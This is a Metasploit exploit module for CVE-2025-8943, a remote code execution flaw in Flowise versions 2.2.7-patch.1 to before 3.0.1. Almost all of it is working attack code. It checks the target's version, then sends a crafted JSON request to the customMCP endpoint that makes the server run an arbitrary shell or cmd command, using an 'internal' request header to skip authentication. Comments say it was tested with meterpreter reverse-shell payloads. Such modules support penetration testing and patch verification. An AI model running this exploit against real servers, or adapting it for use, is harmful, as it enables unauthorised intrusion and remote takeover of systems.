##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Flowise Custom MCP Remote Code Execution',
        'Description' => %q{
          This module exploits a remote code execution vulnerability in Flowise versions >= 2.2.7-patch.1
          and < 3.0.1. The vulnerability exists in the customMCP endpoint (/api/v1/node-load-method/customMCP)
          located in packages/components/nodes/tools/MCP/CustomMCP/CustomMCP.ts and packages/components/nodes/tools/MCP/core.ts,
          which allows users to execute arbitrary commands via StdioClientTransport by using the 'x-request-from: internal' header.
          When FLOWISE_USERNAME and FLOWISE_PASSWORD are not configured, the exploit works unauthenticated. If Basic Auth is
          enabled, the FLOWISE_USERNAME and FLOWISE_PASSWORD options must be set to provide credentials.
        },
        'Author' => [
          'Assaf Levkovich', # Vulnerability discovery (JFrog)
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-8943'],
          ['URL', 'https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/']
        ],
        'Platform' => %w[unix linux win],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter_reverse_tcp
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter_reverse_tcp
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2025-08-14',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 3000
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('FLOWISE_USERNAME', [false, 'Flowise username for Basic Auth (required if FLOWISE_USERNAME env var is set)', '']),
      OptString.new('FLOWISE_PASSWORD', [false, 'Flowise password for Basic Auth (required if FLOWISE_PASSWORD env var is set)', ''])
    ])
  end

  def check
    version_url = normalize_uri(target_uri.path, 'api', 'v1', 'version')
    res = send_request_cgi({
      'uri' => version_url,
      'method' => 'GET',
      'headers' => { 'Accept' => 'application/json' }
    })

    return CheckCode::Unknown('Could not retrieve Flowise version') unless res&.code == 200

    json_data = res.get_json_document
    version_str = json_data['version']
    return CheckCode::Detected('Could not retrieve Flowise version') if version_str.blank?

    version = Rex::Version.new(version_str)
    print_status("Flowise version detected: #{version}")

    # Vulnerability introduced in 2.2.7-patch.1 (March 14, 2025) and fixed in 3.0.1 (May 29, 2025)
    if version >= Rex::Version.new('2.2.7') && version < Rex::Version.new('3.0.1')
      return CheckCode::Appears("Version #{version} is vulnerable (affected: >= 2.2.7-patch.1 and < 3.0.1)")
    end

    CheckCode::Safe("Version #{version} is not vulnerable")
  end

  def execute_command(cmd, _opts = {})
    command = 'sh'
    args = ['-c', cmd]

    if target.platform.names.include?('Windows')
      command = 'cmd'
      args = ['/c', cmd]
    end

    payload = {
      'inputs' => {
        'mcpServerConfig' => {
          'command' => command,
          'args' => args
        }
      },
      'loadMethod' => 'listActions'
    }

    exploit_url = normalize_uri(target_uri.path, 'api', 'v1', 'node-load-method', 'customMCP')

    request_opts = {
      'uri' => exploit_url,
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'x-request-from' => 'internal'
      },
      'data' => payload.to_json
    }

    # Add Basic Auth if credentials are provided
    if !datastore['FLOWISE_USERNAME'].blank? && !datastore['FLOWISE_PASSWORD'].blank?
      request_opts['username'] = datastore['FLOWISE_USERNAME']
      request_opts['password'] = datastore['FLOWISE_PASSWORD']
    end

    res = send_request_cgi(request_opts)

    unless res
      vprint_error('No response from server')
      return false
    end

    case res.code
    when 200
      vprint_status('Command sent successfully (HTTP 200)')
      return true
    when 401
      vprint_error('Authentication required - check FLOWISE_USERNAME and FLOWISE_PASSWORD options')
      return false
    when 404
      vprint_error('Endpoint not found - target may not be vulnerable or CustomMCP not available')
      return false
    when 500
      vprint_error('Server error - command may have failed to execute')
      return true
    else
      vprint_warning("Unexpected HTTP response code: #{res.code}")
      return true
    end
  end

  def exploit
    fail_with(Failure::PayloadFailed, 'Failed to run payload') unless execute_command(payload.encoded)
  end
end
